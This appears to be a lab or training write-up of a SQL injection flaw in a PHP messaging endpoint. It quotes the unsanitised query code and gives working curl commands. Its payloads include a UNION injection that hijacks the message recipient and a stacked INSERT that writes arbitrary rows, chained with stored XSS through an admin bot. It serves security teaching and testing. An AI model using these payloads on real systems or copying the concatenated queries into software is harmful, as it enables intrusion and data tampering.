# 06 — SQL injection in the message form (recipient + stored data)

- **OWASP Top 10 (2021):** A03:2021 – Injection
- **Severity:** Medium
- **Difficulty:** Medium

## Where

`web/panel/messages.php` — `POST /panel/messages.php` (`require_login()`,
any role):

```php
// recipient lookup, ~line 101:
$r = mysqli_query($db, 'SELECT id FROM users WHERE username = \'' . $to . '\'');
$t = mysqli_fetch_assoc($r);

// stored row, ~line 104:
mysqli_query($db, 'INSERT INTO messages (from_id, to_id, subject, body, preview, created_at)
  VALUES (' . (int)$me['id'] . ', ' . (int)$t['id'] . ', \'' . $subject . '\',
  \'' . $body . '\', \'' . $preview . '\', \'' . date('Y-m-d H:i:s') . '\'')');
```

## How it works (root cause)

Two separate injection points in one endpoint:

1. **Recipient selection is injectable** (`$to`): the first row of the
   (UNION-extended) result set decides *who receives* the message.
2. **The INSERT is unescaped** (`$subject`, `$body`, `$preview`): same class
   as 07 — stored SQLi / data tampering on the message row.

## Exploitation steps

1. **Hijack the recipient** — write "to ulla" but deliver to `admin`:

   ```bash
   curl -s -b /tmp/ulla.jar -d "to=x' UNION SELECT id FROM users WHERE username='admin' -- &subject=Hej&body=Hall%C3%B6+admin" \
        http://localhost:8080/panel/messages.php
   ```

2. Verify in the database:

   ```bash
   LD_LIBRARY_PATH=runtime/mysql/extra-libs \
     runtime/mysql/root/bin/mysql -uroot -h127.0.0.1 -P3307 osede_db \
     -e "SELECT id, from_id, to_id, subject FROM messages ORDER BY id DESC LIMIT 1;"
   ```

3. (Stored-data variant) inject into the stored row, e.g. a second
   `INSERT` via `body`:

   ```
   body = x'); INSERT INTO notes (title, body, created_at) VALUES ('pwned', 'pwned', NOW()); --
   ```

## Working PoC (verified)

```
to      = x' UNION SELECT id FROM users WHERE username='admin' --
subject = Hej
body    = Hallö admin
```

Database result after the POST:

```
id=12  from_id=1  to_id=2  subject='Hej'
```

`to_id=2` is `admin` — the message was delivered to the admin inbox despite
`to` nominally being a junk value. The adminvisit bot picks it up on its
next tick (which is also how 15 executes stored XSS in the subject).

## Expected result / verification

- New row in `messages` with `to_id` = the attacker's chosen user (admin).
- With the stored variant: a new row in `notes` (or any other table the
  `osede_app` user can write to) appears without ever touching that form.

## Attack chain

```
recipient hijack (UNION)
  → spam/impersonate any user, or deliver stored-XSS subjects (15) to admin
    → adminvisit bot executes the script in the admin session
stored INSERT tampering
  → write arbitrary rows into any table (notes, reset_codes, messages)
    → e.g. seed a note containing a password hint, or pre-create a reset code
```

## Notes

- `osede_app` has `ALL PRIVILEGES` on the schema, so multi-statement INSERT
  breakouts (if the client allows multi-statements) or stacked effects via
  `;` in a context that executes them both are possible. The practical
  impact here is data tampering: forging messages/notes/reset codes.
